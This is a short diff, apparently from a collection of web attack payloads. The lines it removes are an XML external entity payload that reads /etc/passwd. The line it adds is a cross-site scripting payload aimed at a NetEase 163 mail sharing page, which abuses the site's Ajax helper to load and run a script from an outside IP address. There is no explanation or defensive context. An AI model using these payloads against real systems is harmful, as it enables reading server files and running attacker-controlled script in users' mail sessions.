@@ -1,4 +1,1 @@
-  <?xml version="1.0" encoding="ISO-8859-1"?>
- <!DOCTYPE foo [  
-   <!ELEMENT foo ANY >
-   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+     http://mail.163.com/share/mail2me.htm#email=<svg/onmouseover='netease.mail.base.Ajax._resourceRequest({url:"//104.131.170.172/scl.js",requestType:"script"})' />@
